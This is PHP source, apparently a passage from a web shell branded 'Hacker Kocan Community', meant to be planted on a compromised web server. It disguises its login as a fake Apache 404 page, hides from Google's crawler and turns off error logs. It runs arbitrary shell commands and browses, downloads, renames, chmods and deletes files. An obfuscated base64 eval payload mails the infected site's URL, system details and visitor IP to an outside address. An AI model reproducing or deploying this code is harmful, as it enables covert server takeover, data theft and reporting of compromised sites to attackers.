<?php
/*********************************************************************************************************/
$auth_pass = "f7349c313cfa84f586a7eb96cad68584";#aerul MD5_Hash
/*********************************************************************************************************/
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
/*********************************************************************************************************/
# Avoid google's crawler
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; }
/*********************************************************************************************************/
@session_start();
@error_reporting(0);
@ini_set("memory_limit", "-1");
@set_time_limit(0);
@ini_set('display_errors', 0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'Hacker Kocan Community');
@define('TITLE', 'Powered by');
/*********************************************************************************************************/
if( get_magic_quotes_gpc() )
{
function stripslashes_array($array) { return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); }
$_POST = stripslashes_array($_POST);
}
function logout()
{
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
$page = $host='http://'.$_SERVER['SERVER_NAME'].'/'.$_SERVER['PHP_SELF'];
echo '<center><span class="b1">Anda telah LogOut!!</scan></center>';
?>
<script>window.location.href = '<?php print $page; ?>';</script>
<?php
exit(0);
}


function printLogin()
{
?>
<?
$shell_data = "JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IGlmKCAkdmlzaXRjb3VudCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgJHN5c3RlbSA9IEBwaHBfdW5hbWUoKTsgJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsgJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyAkdGFyZ2V0ID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7ICRib2R5ID0gIkJvc3MsIHRoZXJlIHdhcyBhbiBpbmplY3RlZCB0YXJnZXQgb24gJHRhcmdldCBieSAkdmlzaXRvciI7IEBtYWlsKCJyb290QGFlcnVsY3liZXIuYml6IiwiaHR0cDovLyR0YXJnZXQgJHN5c3RlbSBieSAkdmlzaXRvciIsICIkYm9keSIpOyB9IGVsc2UgeyAkdmlzaXRjb3VudDsgfSBzZXRjb29raWUoInZpc2l0cyIsJHZpc2l0Y291bnQpOw=="; eval(base64_decode($shell_data));
?>
<html>
	<head>
	<style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style>
	</head>
        <title>
        404 Not Found
        </title>
        <body>
	<h1>Not Found</h1>
	<p>The requested URL was not found on this server. </p>
	<hr>
	<form method=post>
	<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80<center><input type=password name=x><input type=submit value=''></center></address>
	</form>
	</body>
</html>
<?php
exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
{
if( empty( $auth_pass ) || ( isset( $_POST['x'] ) && ( md5($_POST['x']) == $auth_pass ) ) )
{ $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; }
else
{ printLogin(); }
}
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
$file = $_GET['dl'];
$filez = @file_get_contents($file);
header("Content-type: application/octet-stream");
header("Content-length: ".strlen($filez));
header("Content-disposition: attachment; filename=\"".basename($file)."\";");
echo $filez;
exit;
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
$file = $_GET['dlgzip'];
$filez = gzencode(@file_get_contents($file));
header("Content-Type:application/x-gzip\n");
header("Content-length: ".strlen($filez));
header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
echo $filez;
exit;
}
// view image
if(isset($_GET['img'])){
@ob_clean();
$d = magicboom($_GET['y']);
$f = $_GET['img'];
$inf = @getimagesize($d.$f);
$ext = explode($f,".");
$ext = $ext[count($ext)-1];
 @header("Content-type: ".$inf["mime"]);
 @header("Cache-control: public");
@header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
@header("Cache-control: max-age=".(60*60*24*7));
 @readfile($d.$f);
 exit;
}
$ver = VERSION;
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE;
else $safemode = FALSE;
$system = @php_uname();
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE;
if(isset($_GET['y']))
{ if(@is_dir($_GET['view'])){ $pwd = $_GET['view']; @chdir($pwd); } else{ $pwd = $_GET['y']; @chdir($pwd); } }
if(!$win)
{ if(!$user = rapih(exe("whoami"))) $user = ""; if(!$id = rapih(exe("id"))) $id = ""; $prompt = $user." \$ "; $pwd = @getcwd().DIRECTORY_SEPARATOR; }
else
{
$user = @get_current_user();
$id = $user;
$prompt = $user." &gt;";
$pwd = realpath(".")."\\";
$v = explode("\\",$d);
$v = $v[0];
foreach (range("A","Z") as $letter)
{
$bool = @is_dir($letter.":\\");
if ($bool)
{
$letters .= "<a href=\"?y=".$letter.":\\\">[ ";
if ($letter.":" != $v) {$letters .= $letter;}
else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
$letters .= " ]</a> ";
}
}
}
####################
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
$free = convertByte(disk_free_space("/"));
$total = convertByte(disk_total_space("/"));
$free_percent = round(100/($total/$free),2)."%";
###########################
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
$bytes = disk_free_space(".");
$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
$base = 1024;
$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
$totalspace_bytes = disk_total_space(".");
$totalspace_si_prefixs = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
$totalspace_bases = 1024;
$totalspace_class = min((int)log($totalspace_bytes , $totalspace_bases) , count($totalspace_si_prefixs) - 1);
$totalspace_show = sprintf('%1.2f' , $totalspace_bytes / pow($totalspace_bases,$totalspace_class)) . ' ' . $totalspace_si_prefixs[$totalspace_class] . '';
$freespace_show = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '';
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_contact = $_SERVER['SERVER_ADMIN'];
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++)
{
$pathz = "";
for($j = 0 ; $j <= $i ; $j++)
{
$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
}
$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}
if(isset($_POST['rename'])){
$old = $_POST['oldname'];
$new = $_POST['newname'];
@rename($pwd.$old,$pwd.$new);
$file = $pwd.$new;
}
if(isset($_POST['chmod'])){
$name = $_POST['name'];
$value = $_POST['newvalue'];
if (strlen($value)==3){
$value = 0 . "" . $value;}
@chmod($pwd.$name,octdec($value));
$file = $pwd.$name;}
if(isset($_POST['chmod_folder'])){
$name = $_POST['name'];
$value = $_POST['newvalue'];
if (strlen($value)==3){
$value = 0 . "" . $value;}
@chmod($pwd.$name,octdec($value));
$file = $pwd.$name;}
//////////////////////////////////////////////////
$disablefunc = @ini_get("disable_functions");
function showdisablefunctions() {
if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#00FF1E'>".$disablefunc."</span>"; }
else { return "<span style='color:#00FF1E'>NONE</span>"; }
}
function ex($cfe) {
$res = '';
if (!empty($cfe)) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
} else { $res = "Ex() Disabled!"; }
}
return $res;
}


function showstat($stat) {
if ($stat=="on") { return "<font style='color:#00FF00'>ON</font>"; }
else {return "<font style='color:#FF0000'>OFF</font>";}
}
function testperl() {
if (ex('perl -h')) { return showstat("on"); }
else { return showstat("off"); }
}
function testfetch() {
if(ex('fetch --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testwget() {
if (ex('wget --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testoracle() {
if (function_exists('ocilogon')) { return showstat("on"); }
else { return showstat("off"); }
}
function testpostgresql() {
if (function_exists('pg_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmssql() {
if (function_exists('mssql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testcurl() {
if (function_exists('curl_version')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmysql() {
if (function_exists('mysql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}

$quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
{
$quot = "<font style='color:#00FF00'>ON</font></b></font>";
}
else
{
$quot = "<font color='#FF0000'>OFF</font>";
}
/////////////////////////////////////////////////////////////////////
// print useful info
$buff = $DISP_SERVER_SOFTWARE."<br />";
$buff .="Operation System : <span style='color:#00FF1E;'>".$system."</span><br />"; 
$buff .="ID : <span style='color:#00FF1E;'>".$id."</span><br />"; 
$buff .= "Server IP : "."<span style='color:#FF8800'>$server_ip</span>"."<font> | </font>"."Your IP : "."<span style='color:#FF0000'>$my_ip</span>"."<br />";
$buff .= "Total HDD Space : "."<span style='color:#00FF1E'>$totalspace_show</span>"."<font> | </font>"."Free HDD Space : "."<span style='color:#00FF1E'>$freespace_show</span>"."<font> | Free HDD Percent <span style='color:#FF9900'>($free_percent)</span>"."<br/>";
$buff .=  "Admin Server : "."<span style='color:#00FF1E'> $admin_contact </span>"."<br/>";
$buff .=  "Magic Quotes:$quot"."<br>";
$buff .= "MySQL: ".testmysql()." MSSQL: ".testmssql()." Oracle: ".testoracle(). " PostgreSQL: ".testpostgresql()." cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()."<br>";
if($safemode) 
$buff .= "safemode <span class=\"gaya\">ON</span><br />"; else $buff .= "safemode <span class=\"gaya\">OFF<span><br />"; 
if(''==($gaya=@ini_get('disable_functions')))$buff .= "Disable_functions : <span style='color:#00FF1E'>NONE</span><br />"; 
else $buff .= "Disable_functions : <span class=\"gaya\">$gaya<span><br />";
$buff .= $letters."&nbsp;&gt;&nbsp;".$pwdurl;
function rapih($text){ return trim(str_replace("<br />","",$text)); }
function magicboom($text){ if (!get_magic_quotes_gpc()) { return $text; } return stripslashes($text); }
function showdir($pwd,$prompt)
{
$fname = array();
$dname = array();
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
$user = "????:????";
if($dh = opendir($pwd))
{
while($file = readdir($dh))
{
if(is_dir($file))
{ $dname[] = $file; }
elseif(is_file($file))
{ $fname[] = $file; }
}
closedir($dh);
}
sort($fname);
sort($dname);
$path = @explode(DIRECTORY_SEPARATOR,$pwd);
$tree = @sizeof($path);
$parent = "";
$buff = "<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
<table class=\"cmdbox\" style=\"width:50%;\">
<tr>
<td>CMD@$prompt</td>
<td><input onMouseOver=\"\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" />
<input class=\"inputzbut\" type=\"submit\" value=\"Execute !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
</tr>
</form>
<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
<tr>
<td>view file/folder</td>
<td><input onMouseOver=\"\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" />
<input class=\"inputzbut\" type=\"submit\" value=\"Enter !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
</tr>
</form>
</table>
<table class=\"explore\">
<tr>
<th>name</th>
<th style=\"width:80px;\">size</th>
<th style=\"width:210px;\">owner:group</th>
<th style=\"width:80px;\">perms</th>
<th style=\"width:110px;\">modified</th>
<th style=\"width:190px;\">actions</th>
</tr> ";
if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
else $parent = $pwd;
foreach($dname as $folder)
{
if($folder == ".")
{
if(!$win && $posix)
{
$name=@posix_getpwuid(@fileowner($folder));
$group=@posix_getgrgid(@filegroup($folder));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
}
else { $owner = $user; }
$buff .= "<tr>
<td><a href=\"?y=".$pwd."\">$folder</a></td>
<td>-</td>
<td style=\"text-align:center;\">".$owner."</td>
<td>".get_perms($pwd)."</td>
<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td>
<td><span id=\"titik1\">
<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a>
| <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
    </span>
<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" />
</form>
</td>
</tr> ";
}
elseif($folder == "..")
{
if(!$win && $posix)
{
$name=@posix_getpwuid(@fileowner($folder));
$group=@posix_getgrgid(@filegroup($folder));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
}
else { $owner = $user; }
$buff .= "<tr>
<td><a href=\"?y=".$parent."\">$folder</a></td>
<td>-</td>
<td style=\"text-align:center;\">".$owner."</td>
<td>".get_perms($parent)."</td>
<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
<td><span id=\"titik2\">
<a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a>
| <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a>
    </span>
<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" />
</form>
</td>
</tr>";
}
else
{
if(!$win && $posix)
{
$name=@posix_getpwuid(@fileowner($folder));
$group=@posix_getgrgid(@filegroup($folder));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
}
else { $owner = $user; }
$buff .= "<tr>
<td>
<a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><img src='data:image/png;base64,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' />     [ $folder ]</a>
<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\"
onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
</form>
</td>
<td>DIR</td>
<td style=\"text-align:center;\">".$owner."</td>
<td>".get_perms($pwd.$folder)."</td>
<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a>
| <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a>
</td>
</tr>";
}
}
foreach($fname as $file)
{
$full = $pwd.$file;
if(!$win && $posix)
{ 
$name=@posix_getpwuid(@fileowner($file));
$group=@posix_getgrgid(@filegroup($file));
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
}
else { $owner = $user; }
$buff .= "<tr>
<td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</a>
<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\"
onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
</form> </td>
<td>".ukuran($full)."</td>
<td style=\"text-align:center;\">".$owner."</td>
<td>".get_perms($full)."</td>
<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a>
| <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a>
| <a href=\"?y=$pwd&amp;delete=$full\">delete</a>
| <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
</td>
</tr>";
}
$buff .= "</table>"; return $buff;
}
function ukuran($file)
{
if($size = @filesize($file))
{ 
if($size <= 1024) return $size;
else
{
if($size <= 1024*1024)
{ $size = @round($size / 1024,2);; return "$size kb"; }
else { $size = @round($size / 1024 / 1024,2); return "$size mb"; }
}
}
else return "???";
